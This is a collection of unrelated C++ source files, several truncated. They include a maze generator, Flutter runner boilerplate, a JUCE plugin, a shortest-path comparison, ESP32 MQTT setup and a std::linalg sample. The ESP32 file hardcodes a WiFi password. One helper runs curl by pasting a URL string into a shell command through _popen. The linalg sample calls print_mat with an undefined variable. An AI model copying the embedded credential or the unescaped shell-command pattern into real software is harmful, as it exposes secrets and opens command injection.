    "#include \"pch.h\"\n#include \"Board.h\"\n#include \"Player.h\"\n\n\nconst char* TILE = \"\u25a0\";\n\nBoard::Board()\n{\n    \n}\n\nBoard::~Board()\n{\n}\n\nvoid Board::Init(int32 size, Player* player)\n{\n    _size = size;\n    _player = player;\n\n    GenerateMap();\n}\n\nvoid Board::Render()\n{\n    ConsoleHelper::SetCursorPosition(0, 0);\n    ConsoleHelper::ShowConsoleCursor(false);\n\n    for (int32 y = 0; y < 25; y++)\n    {\n        for (int32 x = 0; x < 25; x++)\n        {\n            ConsoleColor color = GetTileColor(Pos{ x, y });\n            ConsoleHelper::SetCursorColor(color);\n            cout << TILE;\n        }\n        cout << endl;\n    }\n}\n\n// Binary Tree \ubbf8\ub85c \uc0dd\uc131 \uc54c\uace0\ub9ac\uc998\n// - Mazes For Programmers\nvoid Board::GenerateMap()\n{\n    for (int32 y = 0; y < _size; y++)\n    {\n        for (int32 x = 0; x < _size; x++)\n        {\n            if (x % 2 == 0 || y % 2 == 0)\n            {\n                _tile[y][x] = TileType::WALL;\n            }\n            else\n            {\n                _tile[y][x] = TileType::EMPTY;\n            }\n        }\n    }\n\n    // \ub79c\ub364\uc73c\ub85c \uc6b0\uce21 or \uc544\ub798\ub85c \uae38\uc744 \ub6ab\ub294 \uc791\uc5c5\n    for (int32 y = 0; y < _size; y++)\n    {\n        for (int32 x = 0; x < _size; x++)\n        {\n            if (x % 2 == 0 || y % 2 == 0)\n            {\n                continue;\n            }\n            if (y == _size - 2 && x == _size - 2)\n            {\n                continue;\n            }\n\n            if (x == _size - 2)\n            {\n                _tile[y + 1][x] = TileType::EMPTY;\n                continue;\n            }\n            if (y == _size - 2)\n            {\n                _tile[y][x + 1] = TileType::EMPTY;\n                continue;\n            }\n\n            const int32 randValue = ::rand() % 2;\n            switch (randValue)\n            {\n            case 0:\n                _tile[y][x + 1] = TileType::EMPTY;\n                break;\n            case 1:\n            default:\n                _tile[y + 1][x] = TileType::EMPTY;\n                break;\n            }\n        }\n    }\n}\n\nTileType Board::GetTileType(Pos pos)\n{\n    if (pos.x < 0 || pos.x >= _size)\n    {\n        return TileType::NONE;\n    }\n    if (pos.y < 0 || pos.y >= _size)\n    {\n        return TileType::NONE;\n    }\n    return _tile[pos.y][pos.x];\n}\n\nConsoleColor Board::GetTileColor(Pos pos)\n{\n    if (_player && _player->GetPos() == pos)\n    {\n        return ConsoleColor::YELLOW;\n    }\n\n    if (GetExitPos() == pos)\n    {\n        return ConsoleColor::BLUE;\n    }\n\n    TileType tileType = GetTileType(pos);\n\n    switch (tileType)\n    {\n    case TileType::EMPTY:\n        return ConsoleColor::GREEN;\n    case TileType::WALL:\n        return ConsoleColor::RED;\n    }\n\n    return ConsoleColor::WHITE;\n}",
    "#include <cmath>\n#include <iostream>\n#include <string>\n#include \"../../includes/json.hpp\"\n\n#define function auto\n\nusing namespace std;\nusing json = nlohmann::json;\n\nclass Console\n{\npublic:\n    template <typename T>\n    void log(T text) { std::cout << text << std::endl; }\n};\n\nclass Network\n{\npublic:\n    string get(string url)\n    {\n        std::string cmd = \"curl -s \" + url;\n        FILE *p = _popen(cmd.c_str(), \"r\");\n        char buffer[2];\n        std::string body;\n        if (!p)\n        {\n            return \"Error\";\n        }\n        while (fgets(buffer, sizeof(buffer), p))\n        {\n            body += buffer;\n        }\n        return body;\n    };\n};\n\nclass Json\n{\npublic:\n    json parse(string json_string)\n    {\n        json data = json::parse(json_string);\n        return data;\n    };\n};\n\nclass Variables\n{\npublic:\n    string replace(string variable, string to_be_replaced, string to_replace)\n    {\n        string response = variable.replace(variable.find(to_be_replaced), to_be_replaced.length(), to_replace);\n        return response;\n    };\n};\n\nint main()\n{\n    typedef string let;\n    Console console;\n    Network network;\n    Variables variables;\n    Json JSON;\n\n    let url = \"https://bar-do-jeiz.onrender.com/data\";\n\n    let response = network.get(url);\n\n    json data = JSON.parse(response);\n\n    let teste = \"CARLITO\";\n\n    teste = variables.replace(teste, \"CAR\", \"CARL\");\n\n    function carlos = [&console, &JSON](json data)\n    {\n        console.log(\"Exibindo os 5 primeiros posts do Bar do Jeiz\");\n\n        console.log(data[\"data\"][0].size());\n\n        \n\n        return 0;\n    };\n\n    carlos(data);\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/*\r\n  ==============================================================================\r\n\r\n    This file contains the basic framework code for a JUCE plugin processor.\r\n\r\n  ==============================================================================\r\n*/\r\n\r\n#include \"PluginProcessor.h\"\r\n#include \"PluginEditor.h\"\r\n\r\n//==============================================================================\r\nResonanceSuppressorAudioProcessor::ResonanceSuppressorAudioProcessor()\r\n#ifndef JucePlugin_PreferredChannelConfigurations\r\n     : AudioProcessor (BusesProperties()\r\n                     #if ! JucePlugin_IsMidiEffect\r\n                      #if ! JucePlugin_IsSynth\r\n                       .withInput  (\"Input\",  juce::AudioChannelSet::stereo(), true)\r\n                      #endif\r\n                       .withOutput (\"Output\", juce::AudioChannelSet::stereo(), true)\r\n                     #endif\r\n                       )\r\n    , state(*this, nullptr, \"params\", {\r\n    std::make_unique<juce::AudioParameterFloat>(\"ratio\", \"Ratio\", NormalisableRange<float>(0.01f, 4.0f, 0.01f, std::log (0.5f) / std::log (1.99f / 3.99f)), 1.0f, juce::String(), juce::AudioProcessorParameter::genericParameter, [](float value, int) { return \"1 : \" + juce::String(value, 2); }, [](juce::String text) { return text.replace(\"1 : \",\"\").getFloatValue(); }),\r\n                \r\n    std::make_unique<juce::AudioParameterFloat>(\"freqLow\", \"FreqLow\", NormalisableRange<float>{20.0f, 10000.0f, 0.1f, std::log (0.5f) / std::log (480.0f / 9980.0f)}, 320.0f, juce::String(), juce::AudioProcessorParameter::genericParameter, [](float value, int) { return (value < 1000.0f) ? juce::String (value, 1) + \" Hz\" : juce::String (value / 1000.0f, 2) + \" kHz\"; }, [](juce::String text) { return text.endsWith(\" kHz\") ? text.dropLastCharacters (4).getFloatValue() * 1000.0f : text.dropLastCharacters (3).getFloatValue(); }),\r\n        \r\n    std::make_unique<juce::AudioParameterFloat>(\"freqHi\", \"FreqHi\", NormalisableRange<float>{80.0f, 20000.0f, 1.0f, std::log (0.5f) / std::log (1920.0f / 18000.0f)}, 10200.0f, juce::String(), juce::AudioProcessorParameter::genericParameter, [](float value, int) { return (value < 1000.0f) ? juce::String (value, 1) + \" Hz\" : juce::String (value / 1000.0f, 2) + \" kHz\"; }, [](juce::String text) { return text.endsWith(\" kHz\") ? text.dropLastCharacters (4).getFloatValue() * 1000.0f : text.dropLastCharacters (3).getFloatValue(); }),\r\n        \r\n    std::make_unique<juce::AudioParameterFloat>(\"speed\", \"Pitch Track\", NormalisableRange<float>(0.01f, 0.1f), 0.05f, juce::String(), juce::AudioProcessorParameter::genericParameter, [](float value, int) { return \"x \"+juce::String (value, 2); }, [](juce::String text) { return text.replace(\"x \",\"\").getFloatValue(); }),\r\n              \r\n    std::make_unique<juce::AudioParameterFloat>(\"thresh\", \"Thresh\", NormalisableRange<float>(-64.0f, 6.0f), 0.0f, juce::String(), juce::AudioProcessorParameter::genericParameter, [](float value, int) { return juce::String (value, 1) + \" dB\"; }, [](juce::String text) { return text.dropLastCharacters(3).getFloatValue(); }),\r\n    \r\n    std::make_unique<juce::AudioParameterFloat>(\"attack\", \"Attack\", NormalisableRange<float>(0.1f, 9.9f, 0.01f), 7.0f, juce::String(), juce::AudioProcessorParameter::genericParameter, [](float value, int) { return juce::String (value*10, 1) + \" ms\"; }, [](juce::String text) { return text.dropLastCharacters(3).getFloatValue()/10.0f; }),\r\n        \r\n    std::make_unique<juce::AudioParameterFloat>(\"release\", \"Release\", NormalisableRange<float>(0.1f, 9.9f, 0.01f), 9.0f, juce::String(), juce::AudioProcessorParameter::genericParameter, [](float value, int) { return juce::String (value*10, 1) + \" ms\"; }, [](juce::String text) { return text.dropLastCharacters(3).getFloatValue()/10.0f; }),\r\n        \r\n    std::make_unique<juce::AudioParameterFloat>(\"quality\", \"Q\", NormalisableRange<float>(4.0f, 20.0f), 12.0f, juce::String(), juce::AudioProcessorParameter::genericParameter, [](float value, int) { return juce::String (value, 2); }, [](juce::String text) { return text.getFloatValue(); }),\r\n        \r\n    std::make_unique<juce::AudioParameterFloat>(\"peaks\", \"Analysers\", NormalisableRange<float>(1.0f, 4.0f, 1.0f), 2.0f, juce::String(), juce::AudioProcessorParameter::genericParameter, [](float value, int) { return juce::String (value, 2); }, [](juce::String text) { return text.getFloatValue(); }),\r\n            \r\n    std::make_unique<juce::AudioParameterFloat>(\"gainMain\", \"Gain\", -64.0f, 6.0f, 0.0f),\r\n    std::make_unique<juce::AudioParameterFloat>(\"bypass\", \"Bypass\", 0.0f, 1.0f, 0.0f),\r\n    std::make_unique<juce::AudioParameterFloat>(\"delta\", \"Delta\", 0.0f, 1.0f, 0.0f)\r\n     })\r\n#endif\r\n{\r\n}\r\n\r\nResonanceSuppressorAudioProcessor::~ResonanceSuppressorAudioProcessor()\r\n{\r\n//    for (int i = 0; i < numberOfAnalysers; i++) {\r\n//        analysers[i]->stopThread(1000);\r\n//    }\r\n}\r\n\r\n//==============================================================================\r\nconst juce::String Resonance",
    "#include <iostream>\n#include <vector>\n#include <queue>\n#include <chrono>\n\nusing namespace std;\nusing namespace std::chrono;\n\nvector<vector<pair<int, int>>> makeAdjList(int, const vector<vector<int>>&);\nint findCheapestFlightWithDijkstra(int, const vector<vector<pair<int, int>>>&, int, int);\nint findCheapestFlightWithBellmanFord(int, const vector<vector<pair<int, int>>>&, int, int);\n\n\nint main() {\n    vector<vector<int>> flights = {{0, 1, 100}, {1, 2, 100}, {2, 0, 100}, {1, 3, 600}, {2, 3, 200}};\n    vector<vector<int>> flights2 = {{0, 1, 500}, {0, 2, 700}, {2, 1, -400}, {1, 3, 100}};\n\n\n    vector<vector<pair<int, int>>> adjList = makeAdjList(4, flights);\n    vector<vector<pair<int, int>>> adjList2 = makeAdjList(4, flights2);\n\n    auto start = high_resolution_clock::now();\n    int answerByDijkstra = findCheapestFlightWithDijkstra(4, adjList2, 0, 3);\n    auto stop = high_resolution_clock::now();\n    auto durationOfDijkstra = duration_cast<microseconds>(stop - start);\n\n    start = high_resolution_clock::now();\n    int answerByBellmanFord = findCheapestFlightWithBellmanFord(4, adjList2, 0, 3);\n    stop = high_resolution_clock::now();\n    auto durationOfBellmanFord = duration_cast<microseconds>(stop - start);\n\n    cout << \"Shortest cost by Dijkstra: \" << answerByDijkstra << endl;\n    cout << \"Shortest cost by Bellman Ford: \" << answerByBellmanFord << endl;\n    cout << endl;\n    cout << \"Runtime of Dijkstra: \" << durationOfDijkstra.count() << endl;\n    cout << \"Runtime of Bellman-Ford: \" << durationOfBellmanFord.count() << endl;\n}\n\n/* makeAdjList:\n * Converts vector<vector<int>> to an adjacency list vector<vector<pair<int, int>>>\n * Receives: n: Number of vertices (= airports) in the graph\n *           flights: Represents edges, {{Origin Apt, Dest Apt, Cost}, {Origin Apt, Dest Apt, Cost}, ... }\n * Returns: adjList: {Origin Apt: {Dest Apt, Cost}, {Dest Apt, Cost}, Origin Apt: {Dest Apt, Cost}... } */\nvector<vector<pair<int, int>>> makeAdjList(int n, const vector<vector<int>>& flights) {\n    vector<vector<pair<int, int>>> adjList(n);\n    // (n) creates n empty vectors in adjList, without this, push_back() won't work.\n    for (auto flight : flights) {\n        adjList[flight[0]].push_back({flight[1], flight[2]});\n    }\n    return adjList;\n}\n\n/* findCheapestFlightWithDijkstra:\n * Implements Dijkstra's algorithm, using priority queue to always pop the cheapest airport.\n * Receives : n: Number of vertices (= airports) in the graph\n *            adjList: Adjacency list, please refer to makeAdjList()\n *            src: Origin airport\n *            dst: Destination airport\n * Returns: costs[dst]: Cheapest cost from src to dst */\nint findCheapestFlightWithDijkstra(int n, const vector<vector<pair<int, int>>>& adjList, int src, int dst) {\n    vector<bool> visited(n, false); // We don't really need this boolean vector for a graph only with non-negative weights\n    unordered_map<int, int> costs; // Stores the cheapest cost from src\n    priority_queue<pair<int, int>, vector<pair<int, int>>, greater<pair<int, int>>> minHeap;\n    // Not for storage, but for always accessing the cheapest airport\n    // {{Cost, Dest Apt}, {Cost, Dest Apt}, ... }\n\n    for (int i = 0; i < n; i++) {\n        if (i == src) costs.insert({i, 0});\n        else costs.insert({i, INT_MAX});\n    }\n\n    minHeap.push({costs[src], src});\n\n    while (!minHeap.empty()) {\n        auto current = minHeap.top(); // {Cost, Dest Apt}\n        int cost = current.first;\n        int airport = current.second;\n        visited[airport] = true;\n        minHeap.pop();\n\n        for (auto neighbor : adjList[airport]) { // neighbor: {Dest Apt, Cost}\n            int neighborApt = neighbor.first;\n            int flightCost = neighbor.second;\n            if (!visited[neighborApt] && cost + flightCost < costs[neighborApt]) {\n                costs[neighborApt] = cost + flightCost;\n                minHeap.push({costs[neighborApt], neighborApt});\n                // We only push airports connecting (directly and indirectly) to src airport\n            }\n        }\n    }\n    return costs[dst];\n}\n\n/* findCheapestFlightWithBellmanFord:\n * Implements Bellman-Ford algorithm, simply using loop to iterate all airports (n-1) times.\n * Receives : n: Number of vertices (= airports) in the graph\n *            adjList: Adjacency list, please refer to makeAdjList()\n *            src: Origin airport\n *            dst: Destination airport\n * Returns: costs[dst]: Cheapest cost from src to dst */\nint findCheapestFlightWithBellmanFord(int n, const vector<vector<pair<int, int>>>& adjList, int src, int dst) {\n    unordered_map<int, int> costs;\n\n    for (int i = 0; i < n; i++) {\n        if (i == src) costs.insert({i, 0});\n        else costs.insert({i, INT_MAX});\n    }\n\n    for (int i = 1; i < n; i++) { // Simply loops traversal of (n-1) times\n        for (auto current: costs) {\n            int airport = current.first;\n            int cost = current.second;\n            if (cost == INT_MAX) continue;\n            // ",
    "#include <flutter/dart_project.h>\r\n#include <flutter/flutter_view_controller.h>\r\n#include <windows.h>\r\n\r\n#include \"flutter_window.h\"\r\n#include \"utils.h\"\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\r\n                      _In_ wchar_t *command_line, _In_ int show_command) {\r\n  // Attach to console when present (e.g., 'flutter run') or create a\r\n  // new console when running with a debugger.\r\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\r\n    CreateAndAttachConsole();\r\n  }\r\n\r\n  // Initialize COM, so that it is available for use in the library and/or\r\n  // plugins.\r\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\r\n\r\n  flutter::DartProject project(L\"data\");\r\n\r\n  std::vector<std::string> command_line_arguments =\r\n      GetCommandLineArguments();\r\n\r\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\r\n\r\n  FlutterWindow window(project);\r\n  Win32Window::Point origin(10, 10);\r\n  Win32Window::Size size(1280, 720);\r\n  if (!window.Create(L\"flutter_playground\", origin, size)) {\r\n    return EXIT_FAILURE;\r\n  }\r\n  window.SetQuitOnClose(true);\r\n\r\n  ::MSG msg;\r\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\r\n    ::TranslateMessage(&msg);\r\n    ::DispatchMessage(&msg);\r\n  }\r\n\r\n  ::CoUninitialize();\r\n  return EXIT_SUCCESS;\r\n}\r\n",
    "#include \"mqtt.h\"\n\nconst char *ssid = \"KGB\";\nconst char *password = \"cLCXBX3hugb36tbD\";\n\nconst char *mqtt_server = \"192.168.0.226\";\nconst int mqtt_port = 1883;\n\nconst char *client_id = \"ESP32Client\";\n\nWiFiClient espClient;\nPubSubClient client(espClient);\n\nvoid reconnect();\nuint8_t is_client_connected();\n\nvoid init_mqtt()\n{\n    WiFi.begin(ssid, password);\n\n    while (WiFi.status() != WL_CONNECTED)\n    {\n        delay(500);\n        Serial.print(\".\");\n    }\n\n    Serial.println(\"\\nWiFi connected\");\n    Serial.println(\"IP address: \");\n    Serial.println(WiFi.localIP());\n\n    client.setServer(mqtt_server, mqtt_port);\n}\n\nvoid reconnect()\n{\n    while (!client.connected())\n    {\n        Serial.print(\"Attempting MQTT connection...\");\n\n        if (client.connect(client_id))\n        {\n            Serial.println(\"connected\");\n\n            client.subscribe(\"testTopic\");\n        }\n        else\n        {\n            Serial.print(\"failed, rc=\");\n            Serial.print(client.state());\n            Serial.println(\" try again in 5 seconds\");\n\n            delay(5000);\n        }\n    }\n}\n\nuint8_t is_client_connected()\n{\n    return client.connected();\n}\n\nvoid mqtt_loop()\n{\n    if (!is_client_connected())\n    {\n        reconnect();\n    }\n    client.loop();\n}\n\nvoid send_mqtt_message(const char *topic, const char *message)\n{\n    client.publish(topic, message);\n}",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n  /* __INTEL_COMPILER = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n# if defined(__INTEL_COMPILER_UPDATE)\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n# else\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n  /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__SUNPRO_CC)\n# define COMPILER_ID \"SunPro\"\n# if __SUNPRO_CC >= 0x5100\n   /* __SUNPRO_CC = 0xVRRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>12)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xFF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# else\n   /* __SUNPRO_CC = 0xVRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>8)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# endif\n\n#elif defined(__HP_aCC)\n# define COMPILER_ID \"HP\"\n  /* __HP_aCC = VVRRPP */\n# define COMPILER_VERSION_MAJOR DEC(__HP_aCC/10000)\n# define COMPILER_VERSION_MINOR DEC(__HP_aCC/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__HP_aCC     % 100)\n\n#elif defined(__DECCXX)\n# define COMPILER_ID \"Compaq\"\n  /* __DECCXX_VER = VVRRTPPPP */\n# define COMPILER_VERSION_MAJOR DEC(__DECCXX_VER/10000000)\n# define COMPILER_VERSION_MINOR DEC(__DECCXX_VER/100000  % 100)\n# define COMPILER_VERSION_PATCH DEC(__DECCXX_VER         % 10000)\n\n#elif defined(__IBMCPP__) && defined(__COMPILER_VER__)\n# define COMPILER_ID \"zOS\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__IBMCPP__) && !defined(__COMPILER_VER__) && __IBMCPP__ >= 800\n# define COMPILER_ID \"XL\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__IBMCPP__) && !defined(__COMPILER_VER__) && __IBMCPP__ < 800\n# define COMPILER_ID \"VisualAge\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__PGI)\n# define COMPILER_ID \"PGI\"\n# define COMPILER_VERSION_MAJOR DEC(__PGIC__)\n# define COMPILER_VERSION_MINOR DEC(__PGIC_MINOR__)\n# if defined(__PGIC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PGIC_PATCHLEVEL__)\n# endif\n\n#elif defined(_CRAYC)\n# define COMPILER_ID \"Cray\"\n# define COMPILER_VERSION_MAJOR DEC(_RELEASE_M",
    "// The following is web sample page of C++.\n\n#include <linalg>\n#include <mdspan>\n#include <print>\n#include <string_view>\nnamespace linalg = std::linalg;\n\n// \u884c\u5217(matrix)\u306e\u8981\u7d20\u8868\u793a\ntemplate <class T, class E, class L, class A>\nvoid print_mat(std::string_view name, const std::mdspan<T, E, L, A>& mat)\n{\n  static_assert(mat.rank() == 2);\n  std::println(\"{}:\", name);\n  for (size_t i = 0; i < mat.extent(0); ++i) {\n    for (size_t j = 0; j < mat.extent(1); ++j) {\n      std::print(\" {:2}\", mat[i, j]);\n    }\n    std::println(\"\");\n  }\n}\n\nint main()\n{\n  double arr[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n\n  // \u5217\u512a\u5148\u683c\u7d0d\u9806\u306e\u4e0b\u4e09\u89d2\u8981\u7d20\u304b\u30894x4\u5bfe\u79f0\u884c\u5217\u3092\u69cb\u7bc9\n  std::mdspan<\n    double,\n    std::extents<size_t, 4, 4>,\n    linalg::layout_blas_packed<linalg::lower_triangle_t, linalg::column_major_t>\n  > mat1{arr};\n  // 1 - -  -\n  // 2 5 -  -\n  // 3 6 8  -\n  // 4 7 9 10\n  print_mat(\"mat1\", mat);\n\n  // \u884c\u512a\u5148\u683c\u7d0d\u9806\u306e\u4e0b\u4e09\u89d2\u8981\u7d20\u304b\u30894x4\u5bfe\u79f0\u884c\u5217\u3092\u69cb\u7bc9\n  std::mdspan<\n    double,\n    std::extents<size_t, 4, 4>,\n    linalg::layout_blas_packed<linalg::lower_triangle_t, linalg::row_major_t>\n  > mat2{arr};\n  // 1 - -  -\n  // 2 3 -  -\n  // 4 5 6  -\n  // 7 8 9 10\n  print_mat(\"mat2\", mat2);\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mobx_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"split.h\" // contains a split function that returns all fields that were separated by some character as a vector of strings\n#include <fstream>\n#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\nstruct Item {\n  int id;\n  string description;\n  double price;\n};\n\nstruct Customer {\n  int id;\n  string name;\n  string address;\n  string city;\n  string state;\n  string zip;\n  string phone;\n  string email;\n};\n\nvector<Item> items;\n\nvector<Customer> customers;\n\nvoid read_customers(const string& filename) {\n  ifstream file(filename);\n  string line;\n  while (getline(file, line)) {\n    vector<string> fields = split(line, ',');\n    Customer customer;\n    customer.id = stoi(fields[0]);\n    customer.name = fields[1];\n    customer.address = fields[2];\n    customer.city = fields[3];\n    customer.state = fields[4];\n    customer.zip = fields[5];\n    customer.phone = fields[6];\n    customer.email = fields[7];\n    customers.push_back(customer);\n  }\n    cout << \"Total customers: \" << customers.size() << endl;\n}\n\nvoid read_items(const string& filename) {\n  ifstream file(filename);\n  string line;\n  while (getline(file, line)) {\n    vector<string> fields = split(line, ',');\n    Item item;\n    item.id = stoi(fields[0]);\n    item.description = fields[1];\n    item.price = stod(fields[2]);\n    items.push_back(item);\n  }\n    cout << \"Total items: \" << items.size() << endl;\n}\n\nvoid one_customer_order() {\n  cout << \"Enter customer number: \";\n  int customer_number;\n  try {\n    cin >> customer_number;\n  } catch (...) {\n    cout << \"Invalid customer number\" << endl;\n    return;\n  }\n  for (const Customer& customer : customers) {\n    if (customer.id == customer_number) {\n      cout << \"Welcome \" << customer.name << endl;\n      cout << \"Enter item number (0 to quit)\" << endl;\n      double total = 0;\n      vector<Item> customer_items;\n      while (true) {\n        int item_number;\n        cin >> item_number;\n        if (item_number == 0) {\n          cout << \"Thank you for shopping with us\" << endl;\n          cout << \"Customer: \" << customer.name << endl;\n          cout << \"Address: \" << customer.address << \", \" << customer.city << \", \" << customer.state << \" \" << customer.zip << endl;\n          cout << \"Phone: \" << customer.phone << endl;\n          